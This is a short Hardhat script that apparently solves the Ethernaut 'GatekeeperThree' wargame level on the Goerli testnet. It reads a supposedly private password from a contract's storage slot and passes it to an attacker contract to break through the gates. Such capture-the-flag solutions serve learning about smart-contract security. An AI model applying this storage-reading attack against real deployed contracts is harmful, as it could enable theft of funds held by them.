const { ethers } = require("hardhat");

const INSTANCE_ADDRESS = "0x4b5B472a36722D2a5d4CE866FA97293a0053297d";
const ATTACKER_ADDRESS = "0x47B49408271bEf719112613E1cc28ee8daD6842B";
const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_RPC_URL);

async function main() {
    const gatekeeperThreeAttacker = await ethers.getContractAt("GatekeeperThreeAttack", ATTACKER_ADDRESS);
    const instance = await ethers.getContractAt("GatekeeperThree", INSTANCE_ADDRESS);

    // Get the trick address from the instance
    const trickAddress = await instance.trick();

    // Find the password using storage slots (Slot 2 will be the password)
    const password = await provider.getStorageAt(trickAddress, 2);

    // Attack with the password.
    const tx = await gatekeeperThreeAttacker.attack(password);
    const resp = await tx.wait(1);
    console.log(resp);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});